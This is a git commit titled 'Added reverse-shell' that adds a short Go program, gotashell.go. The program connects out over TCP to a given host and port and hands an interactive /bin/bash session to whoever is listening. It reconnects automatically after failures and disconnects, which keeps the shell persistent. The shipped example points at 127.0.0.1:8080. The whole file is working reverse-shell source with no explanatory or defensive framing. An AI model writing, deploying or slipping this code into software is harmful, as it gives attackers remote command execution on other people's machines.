fccd4a4977c17c11c577bf67b5bd0ad1729f1dd2
nzkoxzu <92158080+nzkoxzu@users.noreply.github.com>
2022-10-19 14:19:17 +0200

    Added reverse-shell

---
+++ gotashell.go
@@ -0,0 +1,32 @@
+package main
+
+import (
+	"net"
+	"os/exec"
+	"time"
+)
+
+func reverse_shell(host string, port string) {
+	connection, err := net.Dial("tcp", host+":"+port)
+	if nil != err {
+		time.Sleep(5 * time.Second)
+		reverse_shell(host, port)
+	}
+
+	// Uses /bin/sh & get
+	cmd := exec.Command("/bin/bash")
+
+	//Get user instructions
+	cmd.Stdin, cmd.Stdout, cmd.Stderr = connection, connection, connection
+
+	// Start connection
+	cmd.Run()
+
+	// Then close connection
+	connection.Close()
+	reverse_shell(host, port)
+}
+
+func main() {
+	reverse_shell("127.0.0.1", "8080")
+}
